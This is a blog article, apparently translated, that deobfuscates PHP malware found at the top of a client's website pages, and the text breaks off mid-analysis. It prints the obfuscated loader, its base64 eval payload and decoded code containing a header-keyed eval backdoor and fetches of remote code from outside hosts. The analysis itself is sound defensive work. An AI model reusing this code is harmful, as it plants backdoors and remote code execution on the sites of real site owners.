<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Deobfuscation of one malicious code</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The new client wanted to transfer its website, consisting of hundreds of static pages to the content management system, and at the same time to our ho...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Deobfuscation of one malicious code</h1><div class="post__text post__text-html js-mediator-article">  The new client wanted to transfer its website, consisting of hundreds of static pages to the content management system, and at the same time to our hosting.  Before transferring the site, a cursory check was carried out and the code found at the top of each page was found: <br><a name="habracut"></a><br><pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">/*versio:2.19*/</span></span>$QQO0=<span class="hljs-number"><span class="hljs-number">95850</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!function_exists(<span class="hljs-string"><span class="hljs-string">'QQ00OOO0'</span></span>)){$GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>] = <span class="hljs-string"><span class="hljs-string">'AsY3VybAaX2luaXQWywYWxsb3dfdXJsX2ZvcGVu?#MQ(G~aHR0cDovLwwVeJndheT1maWxlX2dldF9jb250ZW50cw_=X3NldG9wdATX2V4ZWMqJndheT1jdXJssyiuQLwZOHhb3Nvbi5pbghP%cnllcGR4LmNvbQ{cGhwYWlkZS5jb20_k!dwWV8zOgNtYZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9ytZnRwMTMdIMi4xOQUU9PMDBPUVFRUTAXfHYmFzZTY0X2RlY29kZQeLF~XsYmFzZTY0X2VuY29kZQVGSFRUUFMemoLb2ZmaHR0cHM6Ly8Mp*vo&amp;SFRUUF9IT1NUDE^.dW5pb24$c2VsZWN0^{&amp;UkVRVUVTVF9VUkkDGU0NSSVBUX05BTUUqNctUVVFUllfU1RSSU5HPwGNSL3RtcC8uZm9udC11bml4NmsL3RtcC8uSUNFLXVuaXgdtVE1QAYVEVNUA_SVE1QRElSL3RtcAqT^dXBsb2FkX3RtcF9kaXI(dG1wOd3AtY29udGVudC91cGxvYWRzVnd3AtY29udGVudC9jYWNoZQZmLgT?admVyc2lvNLQILXBocAWSFRUUF9FWEVDUEhQpb3V0jb2sTSFRUUF9VU0VSX0FHRU5Uc%LAF*Z29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgZiL3BnLnBocD91PQ!'</span></span>;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">QQ00OOO0</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($a, $b)</span></span></span></span>{$c=$GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>]; $d=pack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>,<span class="hljs-string"><span class="hljs-string">'6261736536345f6465636f'</span></span>.<span class="hljs-string"><span class="hljs-string">'6465'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $d(substr($c, $a, $b));};$QQQ00QOO0 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">3375</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>);$QQQ00QOO0(<span class="hljs-string"><span class="hljs-string">"/Q00OQOQQ0/e"</span></span>, QQ00OOO0(<span class="hljs-number"><span class="hljs-number">746</span></span>, <span class="hljs-number"><span class="hljs-number">2627</span></span>), <span class="hljs-string"><span class="hljs-string">"Q00OQOQQ0"</span></span>);};</code> </pre> <br>  It is necessary to bring the code to a normal form and find out what it does: <br><pre> <code class="php hljs">$QQO0=<span class="hljs-number"><span class="hljs-number">95850</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!function_exists(<span class="hljs-string"><span class="hljs-string">'QQ00OOO0'</span></span>)) { $GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>] = <span class="hljs-string"><span class="hljs-string">'   base64'</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">QQ00OOO0</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($a, $b)</span></span></span></span>{ $c=$GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>]; $d=pack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>,<span class="hljs-string"><span class="hljs-string">'6261736536345f6465636f'</span></span>.<span class="hljs-string"><span class="hljs-string">'6465'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $d(substr($c, $a, $b)); }; $QQQ00QOO0 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">3375</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); $QQQ00QOO0(<span class="hljs-string"><span class="hljs-string">"/Q00OQOQQ0/e"</span></span>, QQ00OOO0(<span class="hljs-number"><span class="hljs-number">746</span></span>, <span class="hljs-number"><span class="hljs-number">2627</span></span>), <span class="hljs-string"><span class="hljs-string">"Q00OQOQQ0"</span></span>); };</code> </pre><br>  Everything is correct, even the malicious code should not produce errors, so the attacker checks to see if the QQ00OOO0 function has not been determined previously. <br><pre> <code class="php hljs">pack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>,<span class="hljs-string"><span class="hljs-string">'6261736536345f6465636f'</span></span>.<span class="hljs-string"><span class="hljs-string">'6465'</span></span>)</code> </pre><br>  This is just base64_decode.  Therefore, the QQ00OOO0 function takes a piece of our long-line length, cuts it according to the input parameters and decodes from base64. <br>  Now it is clear to us that <pre> <code class="php hljs">$QQQ00QOO0 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">3375</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>);</code> </pre><br>  - preg_replace. <br>  QQ00OOO0 (746, 2627) cuts a substring from our long string and gets <br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(gzuncompress(base64_decode(<span class="hljs-string"><span class="hljs-string">"eJyVV21v2kgQ/isbFEW25Pq8NgZyOZ9ALWks5XAgpFLVIovC0lg1dmSbS6so//1m9oVdEpO7gw+Yndl5n2fG2YZYJ2u2yQq2tjpr1rBqmxXLpqw6tv1ENrti1WRlQUxKumHlxjqNYxrnuUPOTmNKaRyTiEzurq9t8kT0yTZbVWWTbZnVVDtmX5CKNbuqIKYIOH3Wmr6zZpPlDIh5TPPYIadTz0uSqY1i4UMpiJ3ys8SzfIf04D4wwwcVSh53z3HukD5wDLMiS2vWWHsCBYrv2Q6hQM4gDpzlewuLTSJDZZfCoa3dpNEQDcab6aosGlY0tRbR7YECzyYukQ7hk/DI1TJDUBSAon18pGiMDMtrhuapCKXsZ1aDCukzpul0Ok1AFrg/lKcWBgWkg/zWoFBuFQYOtMStgaOeL0MnBVlSjUPe382uk5t5Cj8O+Z+uUgoCqG+/KfhqPPownjmbJfj+JuNsPL+bTeaz0eT2Ei7IIjvO/z6ZTMbv5/P4r3FyN3dIKIpHVutQhkPdQ1GrXZWnq7ysmXGK+WDbh+aXJS9DFrQY7asfOAT4n3VaOY9KK68h3gOofFOXqx/lAyt07Q88rP/Em3oJPkw9eBZGowWqf7iYHCTTNuXksD/Bpc3DjtePbODOx/GcPMlMPZ89Ln9FaAlryNV8fvMbdb2v1dfiqqyb38mTNO0Zjzq8yJKpKLKbq5s0uTXqx+9jo7h4/mk8u42TSYvuu5pV70bfoWlQuBDGhSsFj/eIBidvAJD0zyZnZ8R6ATjknSb/AdboSLkYcehZwxjqDzgWDTcy33t8guAkYBt4yX4+5OWaWZ29jY4SCXy7AiFGcn/xFrqhs23LPcHHdeIXqyPntTCqquUvA4eCgLeW0WyUd1v34KiHXR1iZ+3R9LHKGixcoHuec8p5PYgCLx/4AwSAL1F0kknL659zpAP24UYJ4lf2gi50rARF+rLXX+4aSDinetMpdxmuJiCSre5Lw/YB2B7YrmQ0qmgQ8iqSF10evw7PUguiI7Sc26LsxVTTVN8Dd2hPAr4ody/SZL8n4A7rBaDQoAShnDJT7qRB6YqIS1JikhDS6UBoQtwwSINAkUQzRS8hVLR3VvNiSm/HM+ifL3umwAvQ0oUt8zg8zkJODEAIaNchXVv0wKHegA5AMZXZk2Q3qpuqKfPykVWtSjAugORY5ZuyYsvVPRRVimiyrInMZPSnTjkaCyIfytqSh7rYgpCixYijKOGLvL6IWsBUTcTjsiD2g/8m6xmssk6Ohrrv8QQvxLw/TufD4zV50BdkTGhbCLtej9fk4t/Eu+YC4vvYEjBd35IoUin6HKYWlLpKa5uhez9FcQAKRcPtOlSTyJVN4UqQl53ASxg+OY3WWVUsAXXT9DK+Hqep7X6IZzBpk9ln0HYzmo3gkffJVACpgDjTq77cx/RRqPq5zdE+xWpeHCH2sWUFcTz5dOTaIQWRZtB+R0nTR+cBHjnk9dIY4t4EVtuOCo5GsxBT122noPvtpBB0+T6QDhpNRhJbDbcW2ARFh52oxUQc8oxS0c+tKRGrb50iwi+/8c3buMlt4eshP7wg30D/j/3EarYP0WuD+2Lyy0q6eIFSHVwr0s/p6G5+1VlEkWRTM0Eh/FDODi124GOCHIXQhsJzqoYEgrpJ6GKa1L6EmxRAkgTrtobseVQ2JE499vcyV7dAxtvm9RBDDwZyD1EmsDmqwtLeWB5/VAEXrzkQQa6rKXere/GXv62s8t2apWWxYupQAN8TUf08hM2UFSvcKuSRnDYeb7Dh2+jdk/12gN5qu9FcXb4DmE5hNYawZcjKw4X2NbaDCc6eehJFl3yTl/PKcJW/vPDF01xd+/wdoYsJ5X7phPb9EIOsSssgBOK14nUN9Lu+vMKrRgz4nO/DxrsmLl6wsOnXzYsXKXk+rHz4/gMmng4H"</span></span>)));</code> </pre><br>  As we see, in the end it all comes down to executing the code obtained above.  Let's try to make out what this code does. <br>  Here is what we get after decoding: <br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>)){ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">determinator_feof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($II1Ill, &amp;$I111II = NULL)</span></span></span><span class="hljs-function"> </span></span>{ $I111II = microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> feof($II1Ill); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getfile</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($IlI1lI, $Q00OOQ)</span></span></span></span>{ $IIII11 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>); $IllllI = $IIII11.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>); @ini_set(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">19</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>), <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@ini_get(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">19</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>)) == QQ00OOO0(<span class="hljs-number"><span class="hljs-number">41</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)) { $I111I1=@file_get_contents(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">46</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>) . $IlI1lI . $Q00OOQ. QQ00OOO0(<span class="hljs-number"><span class="hljs-number">59</span></span>, <span class="hljs-number"><span class="hljs-number">30</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $I111I1; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (function_exists($IllllI)){ $QQOQQ0 = @$IllllI(); $Q0000O = $IIII11.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">91</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>); $I1I1II = $IIII11.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>); @$Q0000O($QQOQQ0, CURLOPT_URL, QQ00OOO0(<span class="hljs-number"><span class="hljs-number">46</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>) . $IlI1lI . $Q00OOQ. QQ00OOO0(<span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>)); @$Q0000O($QQOQQ0, CURLOPT_HEADER,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); @$Q0000O($QQOQQ0, CURLOPT_RETURNTRANSFER,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); @$Q0000O($QQOQQ0, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number"><span class="hljs-number">5</span></span>); $Il11II = @$I1I1II($QQOQQ0); @curl_close($QQOQQ0); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($Il11II)){$Il11II = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>);} <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $Il11II; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $II1Ill = @fsockopen($IlI1lI, <span class="hljs-number"><span class="hljs-number">80</span></span>, $QO0Q0O, $QQ0QO0, <span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($II1Ill) { $Ill111 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); $I111II = <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"GET {$Q00OOQ}&amp;way=socket HTTP/1.0\r\nHost: {$IlI1lI}\r\n"</span></span>); $QOQ00O = PHP_OS.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">127</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).PHP_VERSION; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"User-Agent: {$QOQ00O}\r\n\r\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!determinator_feof($II1Ill, $I111II) &amp;&amp; (microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) - $I111II) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>){ $Ill111 .= @fgets($II1Ill, <span class="hljs-number"><span class="hljs-number">128</span></span>); } @fclose($II1Ill); $Q0OQOQ = explode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Ill111); <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($Q0OQOQ[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> implode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Q0OQOQ); } } } $Il1lll = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">133</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">146</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">161</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">write</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($QOO000,$QQ00O0)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($Q00QOO=@fopen($QOO000,QQ00OOO0(<span class="hljs-number"><span class="hljs-number">179</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>))){ @fwrite($Q00QOO,$QQ00O0); @fclose($Q00QOO); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">output</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($Q000QQ, $Q0QQ0O)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> QQ00OOO0(<span class="hljs-number"><span class="hljs-number">181</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>).$Q000QQ.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">185</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).$Q0QQ0O.<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; } @ini_set(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">190</span></span>, <span class="hljs-number"><span class="hljs-number">19</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>); define(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">209</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>), <span class="hljs-number"><span class="hljs-number">1</span></span>); $Q00OO0=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">226</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>); $I11III=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">235</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>); $QQ00QO=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">241</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>); $QQ00OO=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">259</span></span>, <span class="hljs-number"><span class="hljs-number">18</span></span>); $Q0QQOQ=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">283</span></span>, <span class="hljs-number"><span class="hljs-number">18</span></span>); $IlI1lI=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">46</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">303</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>)])){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">303</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>)] != QQ00OOO0(<span class="hljs-number"><span class="hljs-number">314</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)){ $IlI1lI=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">318</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>); } } $IlI1lI.=strtolower(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">335</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>)]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($_GET <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $Q000QQ=&gt;$Q0QQ0O){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0QQ0O,QQ00OOO0(<span class="hljs-number"><span class="hljs-number">351</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>))){$_GET[$Q000QQ]=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>);} <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (strpos($Q0QQ0O,QQ00OOO0(<span class="hljs-number"><span class="hljs-number">359</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>))){$_GET[$Q000QQ]=QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>);} } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)])) { $_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)] = @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">387</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">406</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)]) { $_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)] .= QQ00OOO0(<span class="hljs-number"><span class="hljs-number">422</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>) . @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">406</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)]; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QOQQO0=$IlI1lI.@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">370</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)]){ $IlIlll=@md5($IlI1lI.$I11III.PHP_OS.$QQ00QO); $IIIIl1=dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>).DIRECTORY_SEPARATOR; $QQQQOQ = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>( QQ00OOO0(<span class="hljs-number"><span class="hljs-number">427</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">450</span></span>, <span class="hljs-number"><span class="hljs-number">19</span></span>), @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">471</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)], @$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">477</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>)], @$_ENV[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">471</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)], @$_ENV[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">485</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)], @$_ENV[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">477</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>)], QQ00OOO0(<span class="hljs-number"><span class="hljs-number">493</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>), @ini_get(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">502</span></span>, <span class="hljs-number"><span class="hljs-number">19</span></span>)), $IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">522</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>), $IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">527</span></span>, <span class="hljs-number"><span class="hljs-number">24</span></span>), $IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">553</span></span>, <span class="hljs-number"><span class="hljs-number">22</span></span>), ); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($QQQQOQ <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1I1lI){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($I1I1lI)){ $I1I1lI.=DIRECTORY_SEPARATOR; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_writable($I1I1lI)){ $IIIIl1 = $I1I1lI; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } $tmp=$IIIIl1.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">577</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).$IlIlll; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_Y_AUTH"</span></span>]==$IlIlll){ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">582</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>), $I11III.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">591</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).$Q00OO0.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">594</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QO0QQQ=$QQ00OO(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">601</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)])){ @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($QO0QQQ); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">618</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">623</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_file($tmp)){ @touch($tmp); @<span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $QOQQO0=@urlencode($QOQQO0); $Q0Q0OQ = @strtolower(@$_SERVER[QQ00OOO0(<span class="hljs-number"><span class="hljs-number">627</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>)]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (explode(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">649</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">653</span></span>, <span class="hljs-number"><span class="hljs-number">55</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1l11I){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0Q0OQ, $I1l11I)!==<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@touch($tmp)){ $Q00OOQ = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">710</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>).$QOQQO0.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">725</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>).$IlIlll.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">730</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>).$Q00OO0.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">742</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>).$I11III; $I11lII = getfile($Il1lll[<span class="hljs-number"><span class="hljs-number">0</span></span>], $Q00OOQ); @touch($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } } }</code> </pre><br>  It became even less clear, however we will try to find out what this code does.  We need to format it and do the simplest thing we can do: replace all calls to QQ00OOO0 (number, number) with the strings that this function returns. <br>  We are one step closer to what this source code does: <br><pre> <code class="php hljs"><span 